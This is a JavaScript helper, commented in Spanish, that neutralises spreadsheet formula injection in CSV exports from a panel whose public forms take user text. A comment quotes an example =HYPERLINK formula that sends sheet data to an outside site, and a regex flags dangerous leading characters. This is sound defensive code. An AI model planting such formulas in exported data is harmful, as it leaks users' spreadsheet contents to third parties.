// Celdas de los CSV que descarga el panel (separador «;», se abren con Excel).
// Inyección de fórmulas: nombres, respuestas y textos los escribe cualquiera en los formularios públicos. Una celda que
// empieza por = @ + - (o tabulador / retorno) Excel la ejecuta como fórmula aunque vaya entre comillas, p. ej.
// =HYPERLINK("https://…/?"&A2;"Ver"), que manda datos de la hoja a otra web al pulsar. Se antepone un apóstrofo, que
// la deja como texto. Los números y los teléfonos (+34 600…) o importes negativos (-30) se dejan tal cual.
const PELIGROSO = /^[=@\t\r]|^[+-](?![\d\s().,-]*$)/;

/** Texto de una celda de CSV: neutraliza fórmulas y entrecomilla si hace falta. */
export function celdaCsv(v) {
  if (typeof v === 'number' || typeof v === 'bigint') return String(v);
  let t = String(v ?? '');
  if (PELIGROSO.test(t)) t = `'${t}`;
  return /[",;\r\n]/.test(t) ? `"${t.replace(/"/g, '""')}"` : t;
}
